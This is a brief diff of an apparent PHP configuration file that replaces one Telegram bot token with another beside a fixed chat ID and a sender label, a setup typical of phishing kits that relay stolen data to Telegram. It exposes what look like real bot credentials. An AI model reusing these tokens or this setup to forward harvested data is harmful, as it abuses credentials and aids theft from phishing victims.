@@ -6,7 +6,7 @@
 
 
 /* Put here your TELEGRAM info   */
-$botToken="7068862585:AAH_R_Kl_KXwMSzByEkBeo4kYCI-G9DjVwo";
+$botToken="8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU";
 $chatId="8179736651";  
 
 $Our_Name = " ♣️ " ; 
